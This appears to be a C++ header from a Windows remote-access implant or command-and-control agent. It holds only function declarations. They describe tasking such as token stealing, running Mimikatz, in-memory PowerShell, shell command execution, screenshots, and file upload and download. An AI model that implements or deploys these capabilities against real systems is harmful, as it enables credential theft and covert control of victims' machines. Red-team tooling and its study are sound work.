#pragma once

#include "Core.h"
#include <time.h> // time()
#include <sstream> // string streams
#include <iomanip> // string modifiers
#include <TlHelp32.h> // Process utilities
#include <winsock.h> // Socket utilities
#include <Shlwapi.h> // File utilities

#pragma comment(lib, "Ws2_32.lib") // Socket utilities
#pragma comment(lib, "Shlwapi.lib") // File utilities

DWORD PrepareTasking(State & state);
TaskingData DeserializeData(std::string data);
std::string SerializeData(ResponseData data, State & state);
std::string ExecuteTasking(State & state, std::string inboundData);
std::string CheckForOutput(State & state);

// Tasking Functions
ResponseData GetUID(TaskingData &taskData, State & state);
ResponseData GetPrivileges(TaskingData & taskData, State & state);
ResponseData GetProcessList(TaskingData & taskData, State & state);
ResponseData GetIdleTime(TaskingData & taskData, State & state);
ResponseData LogonAsUser(TaskingData & taskData, State & state);
ResponseData RemoveFile(TaskingData & taskData, State & state);
ResponseData StealToken(TaskingData & taskData, State & state);
ResponseData DownloadFile(TaskingData & taskData, State & state);
ResponseData GetCurrentProcessInformation(TaskingData & taskData, State & state);
ResponseData UploadFile(TaskingData & taskData, State & state);
ResponseData AttemptTCPConnection(TaskingData & taskData, State & state);
ResponseData GetDirectoryListing(TaskingData & taskData, State & state);
ResponseData TakeScreenshot(TaskingData & taskData, State & state);
ResponseData ExecuteShellCommand(TaskingData & taskData, State & state);
ResponseData LoadModule(TaskingData & taskData, State & state);
ResponseData RunPowershell (TaskingData & taskData, State & state);
ResponseData RunMimikatz(TaskingData & taskData, State & state);
ResponseData RunMemoryPowershell(TaskingData & taskData, State & state);
